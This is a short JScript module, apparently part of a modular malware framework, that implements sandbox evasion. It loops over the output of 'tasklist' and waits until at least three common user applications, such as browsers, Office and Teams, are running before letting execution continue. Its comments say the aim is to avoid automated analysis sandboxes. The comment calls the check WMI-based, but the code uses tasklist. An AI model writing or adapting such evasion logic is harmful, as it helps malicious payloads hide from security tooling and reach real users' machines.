// chunk: evasion/triggered_wmi
// depends: core/run_cmd
// provides: wait_for_activity
// format: jscript
// note: WMI-based user activity detection. Waits until at least 3 interactive
//       apps are running (explorer, browser, office) before proceeding.
//       Sandboxes rarely have multiple user applications active.

function wait_for_activity() {
    var maxWait = 120;
    var waited = 0;
    var targetApps = ["explorer.exe", "chrome.exe", "firefox.exe", "msedge.exe",
                      "outlook.exe", "teams.exe", "slack.exe", "notepad.exe",
                      "winword.exe", "excel.exe", "powerpnt.exe"];
    while (waited < maxWait) {
        var procs = _run("tasklist /fo csv /nh").toLowerCase();
        var found = 0;
        for (var i = 0; i < targetApps.length; i++) {
            if (procs.indexOf(targetApps[i]) >= 0) found++;
        }
        if (found >= 3) return;
        WScript.Sleep(5000);
        waited += 5;
    }
}
